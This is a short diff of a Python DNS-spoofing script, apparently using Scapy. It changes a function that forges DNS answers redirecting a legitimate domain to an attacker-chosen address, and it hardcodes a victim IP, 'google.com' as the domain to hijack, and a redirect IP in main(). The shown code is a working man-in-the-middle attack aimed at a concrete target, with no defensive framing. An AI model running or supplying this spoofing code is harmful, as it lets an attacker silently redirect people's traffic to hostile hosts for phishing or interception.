@@ -35,7 +35,7 @@ def MIMspoofDNS(pkt, goodSite, evilSite) :
     EvilDNSResponse[DNS].qr = 1
     EvilDNSResponse[DNS].an = DNSRR(rrname = goodSite, rdata = evilSite)
     EvilDNSResponse[IP].id = pkt[IP].id
-    # EvilDNSResponse.show()
+    EvilDNSResponse.show()
     print(EvilDNSResponse[IP].id)
     send(EvilDNSResponse)
     
@@ -46,6 +46,9 @@ def MIMspoofDNS(pkt, goodSite, evilSite) :
     
 def main() :
     pktCounter = 0
+    ipVictim = '192.168.178.144' # The IP address of the victim
+    goodSite = 'google.com' # The website we want to redirect them from
+    evilSite = '188.114.96.0' # The IP address we want to redirect the victim to
     while True: 
         try:
             pkt = sniffPKT(ipVictim, goodSite)
